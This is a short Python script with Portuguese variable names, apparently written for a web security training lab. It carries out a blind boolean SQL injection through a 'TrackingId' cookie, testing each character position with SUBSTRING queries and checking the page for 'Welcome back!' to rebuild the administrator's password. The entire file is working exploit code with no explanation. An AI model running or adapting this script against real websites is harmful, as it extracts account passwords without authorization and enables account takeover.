import requests
from datetime import datetime

class SenhaDecod():         
    def __init__(self):   
        self.Algarismo = None  
        self.Letra = None  

now = datetime.now()
current_time = now.strftime("%H:%M:%S" )
print("Inicio execucao =", current_time)

url = ''
valorCookie = "33347"
labelResposta = "Welcome back!"
usuario='administrator'

algarismosSenha = [] 
offSetSenha = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
sqlInjection = ""
strSenhaDecod = ""
dicionarioLetras = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','x','w','y','z','0','1','2','3','4','5','6','7','8','9'] 

for letra in dicionarioLetras: 
    for algarismo in offSetSenha: 
        sqlInjection ="' AND (SELECT SUBSTRING(password,'"+ str(algarismo) +"',1) FROM users WHERE username='"+ usuario +"')='"+ letra 
        print(sqlInjection)
        ck={"TrackingId": valorCookie + sqlInjection } 
        response=requests.get('http://' + url,cookies=ck)
        
        if response.text.find(labelResposta) > 0:
            objSenha = SenhaDecod() 
            objSenha.Algarismo = algarismo 
            objSenha.Letra = letra
            algarismosSenha.append(objSenha)  

contadorSenha = 1

for algarismo in offSetSenha: 
    for parteSenha  in algarismosSenha: 
        if (parteSenha.Algarismo == contadorSenha):
            strSenhaDecod += parteSenha.Letra 
            contadorSenha += 1
            break

print(strSenhaDecod)
now = datetime.now()
current_time = now.strftime("%H:%M:%S" )
print("fim execucao =", current_time)
